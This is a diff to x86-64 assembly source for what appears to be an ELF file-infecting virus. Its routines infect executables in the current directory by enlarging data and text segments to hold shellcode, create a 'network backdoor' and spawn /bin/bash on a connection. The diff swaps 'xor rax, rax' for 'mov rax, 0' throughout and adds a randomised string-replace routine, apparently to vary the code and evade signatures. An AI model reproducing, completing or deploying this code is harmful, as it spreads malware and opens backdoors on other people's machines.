@@ -13,7 +13,7 @@ global _start
 _start:
 	call create_soft_bd
 	push rax
-	xor rax, rax
+	mov rax, 0
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -34,7 +34,7 @@ _start:
 ;	mov r10, 0
 ;	mov rax, 61
 ;	syscall; wait(pid/rax, &status, 0, 0, 0);
-;	xor rax, rax
+;	mov rax, 0
 ;	mov eax, DWORD[rsp]
 ;	cmp rax, 0
 ;	jne exit_prog
@@ -47,11 +47,7 @@ _start:
 	pop rcx 
 	;create network backdoor
 	push rax
-	xor rax, rax
-	nop
-	nop
-	nop
-	nop
+	mov rax, 0
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -73,7 +69,7 @@ _start:
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
 	push rax
-	xor rax, rax
+	mov rax, 0
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -97,7 +93,7 @@ _start:
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
 	push rax
-	xor rax, rax
+	mov rax, 0
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -384,7 +380,7 @@ check_num_name:
 	push rcx
 
 	xor rcx, rcx
-	xor rax, rax
+	mov rax, 0
 	loop_cnn:
 		cmp byte[rdi + rcx], 0
 		je loop_cnn_exit
@@ -584,7 +580,7 @@ retn
 
 ; exec_shell(int connfd)
 exec_shell:
-	xor rax, rax
+	mov rax, 0
 	mov rax, 0x0068; "h\0"
 	push rax
 	mov rax, 0x7361622f6e69622f; "/bin/bas"
@@ -632,7 +628,7 @@ exec_shell:
 retn
 
 ft_strlen:
-	xor rax, rax
+	mov rax, 0
 	loop:
 		cmp byte[rdi + rax], 0
 		je strlen_exit
@@ -725,7 +721,7 @@ famine_file:
 	; parse MAGIC
 	cmp QWORD [rsp + 12], 52; sizeof(Elf32_Ehdr) == 52, check that fsize > sizeof(Elf32_Ehdr) 
 	jb leave_famine_file
-	xor rax, rax
+	mov rax, 0
 	mov rax, QWORD[rsp+4]
 	cmp byte[rax], 0x7f
 	jne leave_famine_file
@@ -1132,7 +1128,7 @@ find_new_entry:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1180,7 +1176,7 @@ find_new_entry_text:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1230,7 +1226,7 @@ find_end_data_seg:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1279,7 +1275,7 @@ find_end_text_seg:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1327,7 +1323,7 @@ has_data_seg:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1373,7 +1369,7 @@ get_data_pad:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1420,7 +1416,7 @@ get_text_pad:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1467,7 +1463,7 @@ parse64elfphdr:
 	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1614,7 +1610,7 @@ parse64elfphdrtext:
 	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -1850,6 +1846,154 @@ push rdi
 pop rdi
 retn
 
+
+;Replaces each occurence of 'to_replace' by 'with' in 'base_str'
+;void ft_str_replace(char *base_str, char *to_replace, char *with, size_t size_base)
+;                          rdi     ,       rsi       ,       rdx ,        r10
+ft_str_replace:
+	push rax
+	push rbx
+	push rcx
+	push r15
+	push r11
+	push r10
+	; calc to_replace length
+	push rdi
+	mov rdi, rsi
+	call ft_strlen
+	mov rcx, rax; rcx = strlen(to_replace)
+	pop rdi
+	
+	mov rax, 0; int i = 0 
+
+	fsr_loop:
+	;check if we're at the end
+	cmp rax, r10
+	je fsr_loop_exit ; we reached end of base
+
+	xor rbx, rbx; int j = 0;
+	fsr_inloop: ; let's check if we can find the str to_replace
+	mov r11b, [rsi + rbx]
+	cmp r11b, 0
+	jne fsr_inloop_cont
+	;if we reach this than it's time to replace
+	push rax 
+	call ft_rand ; replace only sometimes
+	cmp rax, 0
+	je fsr_random_exit
+	pop rax
+	;check delimiter exception (delimiter = 0x60 for now)
+	mov r15, rdi
+	add r15, rax
+	add r15, rbx
+	cmp BYTE[r15], 0x60
+	je fsr_replace_loop_exit
+
+	xor rbx, rbx
+	;replace string
+	fsr_replace_loop:
+	cmp byte[rdx + rbx], 0
+	je fsr_replace_loop_exit
+	mov r15, rdi
+	add r15, rax
+	add r15, rbx
+	mov r11b, [rdx + rbx]
+	mov [r15], r11b
+	inc rbx
+
+	jmp fsr_replace_loop
+	fsr_random_exit:
+	pop rax
+	fsr_replace_loop_exit:
+
+	fsr_inloop_cont:
+	mov r15, rdi
+	add r15, rax
+	add r15, rbx
+	cmp [r15], r11b
+	jne fsr_inloop_exit ; there's a diff
+
+	inc rbx
+	jmp fsr_inloop
+	fsr_inloop_exit:
+
+	inc rax
+	jmp fsr_loop
+	fsr_loop_exit:
+
+	pop r10
+	pop r11
+	pop r15
+	pop rcx
+	pop rbx
+	pop rax
+
+retn
+
+ft_strlen:
+	mov rax, 0
+	loop:
+		cmp byte[rdi + rax], 0
+		je strlen_exit
+		inc rax
+		jmp loop
+	strlen_exit:
+retn
+
+
+
+;puts
+ft_rand:
+	push r11
+	push r15
+	push rbx
+	push rcx
+	push r8
+	push r9
+	push r10
+	push rsi
+	push rdx
+	push rdi
+
+	mov rax, 0x00000000006d6f64
+	push rax
+	mov rax, 0x6e61722f7665642f ; /dev/random
+	push rax
+	mov rdi, rsp; char *filename
+	call open_file
+	mov rdi, rax
+	add rsp, 16
+	sub rsp, 1
+	
+	mov rsi, rsp
+	mov rdx, 1
+	mov rax, 0
+	syscall;read
+
+	cmp BYTE[rsp], 127
+	jae fr_one
+	fr_zero:
+	mov rax, 0
+	jmp fr_end
+	fr_one: 
+	mov rax, 1
+	fr_end:
+
+	add rsp, 1
+
+	pop rdi
+	pop rdx
+	pop rsi
+	pop r10
+	pop r9
+	pop r8
+	pop rcx
+	pop rbx
+	pop r15
+	pop r11
+retn
+
+
 write_jmp_shellcode:
 	sub rsp, 4; rel_jmp
 
@@ -2051,7 +2195,7 @@ has_data_seg32:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx
@@ -2160,7 +2304,7 @@ find_new_entry32:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx
@@ -2209,7 +2353,7 @@ find_new_entry_text32:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx
@@ -2257,7 +2401,7 @@ get_data_pad32:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx
@@ -2305,7 +2449,7 @@ get_text_pad32:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx
@@ -2354,7 +2498,7 @@ parse32elfphdr:
 	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx 
@@ -2442,7 +2586,7 @@ parse32elfphdr:
 		pop rsi
 		pop rcx
 		pop rax
-		xor rax, rax
+		mov rax, 0
 		mov eax, DWORD[r9 + 20]
 		mov DWORD[rsp + 6], eax; store p_memsz
 		add DWORD[rsp + 6], SHELLCODE32_LEN; ADD SHELLCODE LEN (1 as sample)
@@ -2489,7 +2633,7 @@ parse32elfphdr:
 		pop rax	
 		sub DWORD[rsp + 6], SHELLCODE32_LEN; restore memsz for pad calc
 		;set pad value
-		xor rax, rax
+		mov rax, 0
 		mov eax, DWORD[rsp + 6]; p_memsz
 		sub eax, [r9 + 16]; ret = p_memsz - p_filesz
 
@@ -2531,7 +2675,7 @@ parse32elfphdrtext:
 	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx 
@@ -2619,7 +2763,7 @@ parse32elfphdrtext:
 		pop rsi
 		pop rcx
 		pop rax
-		xor rax, rax
+		mov rax, 0
 		mov eax, DWORD[r9 + 20]
 		mov DWORD[rsp + 6], eax; store p_memsz
 		add DWORD[rsp + 6], SHELLCODE32_LEN; ADD SHELLCODE LEN (1 as sample)
@@ -2666,7 +2810,7 @@ parse32elfphdrtext:
 		pop rax	
 		sub DWORD[rsp + 6], SHELLCODE32_LEN; restore memsz for pad calc
 		;set pad value
-		xor rax, rax
+		mov rax, 0
 		mov eax, DWORD[rsp + 6]; p_memsz
 		sub eax, [r9 + 16]; ret = p_memsz - p_filesz
 
@@ -2723,7 +2867,7 @@ parse32elfsec:
 	;now we need to calculate the offset to EHDR + PHDR*e_phnum
 	xor rbx, rbx
 	mov bx, WORD[rsi + 44]; bx == e_phnum
-	xor rax, rax
+	mov rax, 0
 	mov eax, 32; sizeof(Elf64_Phdr)
 	mul rbx; rbx * rax -> rax
 	add eax, DWORD[rsi + 28]; e_phoff
@@ -2779,7 +2923,7 @@ find_end_data_seg32:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx
@@ -2800,7 +2944,7 @@ find_end_data_seg32:
 		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
 		jne continue_feds32
 		;we found the data segment ! bss ect... This is where the shellcode will be
-		xor rax, rax
+		mov rax, 0
 		mov eax, DWORD[r9 + 16];store p_filesz
 		add eax, DWORD[r9 + 4]; add p_offset so this gives us "the end" of the segment
 		continue_feds32:
@@ -2830,7 +2974,7 @@ find_end_text_seg32:
 
 	sub rsp, 2; e_phnum
 
-	xor rax, rax
+	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
 	xor rbx, rbx
@@ -2851,7 +2995,7 @@ find_end_text_seg32:
 		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_X) means text seg, we're gonna infect it
 		jne continue_fets32
 		;we found the data segment ! bss ect... This is where the shellcode will be
-		xor rax, rax
+		mov rax, 0
 		mov eax, DWORD[r9 + 16];store p_filesz
 		add eax, DWORD[r9 + 4]; add p_offset so this gives us "the end" of the segment
 		continue_fets32:
